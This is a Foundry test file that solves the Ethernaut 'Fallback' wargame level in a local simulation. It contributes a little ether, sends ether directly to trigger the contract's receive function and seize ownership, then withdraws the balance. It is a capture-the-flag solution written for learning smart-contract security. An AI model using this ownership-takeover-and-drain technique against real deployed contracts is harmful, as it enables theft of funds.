// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.36;

import {Test} from "forge-std/Test.sol";
import {Fallback} from "ethernaut/contracts/src/levels/Fallback.sol";
import {FallbackFactory} from "ethernaut/contracts/src/levels/FallbackFactory.sol";

contract FallbackTest is Test {
    address public immutable player = makeAddr("player");
    FallbackFactory public factory;
    Fallback public level;

    function setUp() public {
        factory = new FallbackFactory();
        level = Fallback(payable(factory.createInstance(player)));
    }

    function test_exploit_Fallback() public {
        assertNotEq(level.owner(), player);

        vm.deal(player, 10 ether);
        vm.startPrank(player);
        level.contribute{value: 0.0001 ether}();

        (bool success,) = payable(address(level)).call{value: 0.1 ether}("");
        assert(success);

        level.withdraw();
        vm.stopPrank();

        assert(factory.validateInstance(payable(address(level)), player));
    }
}
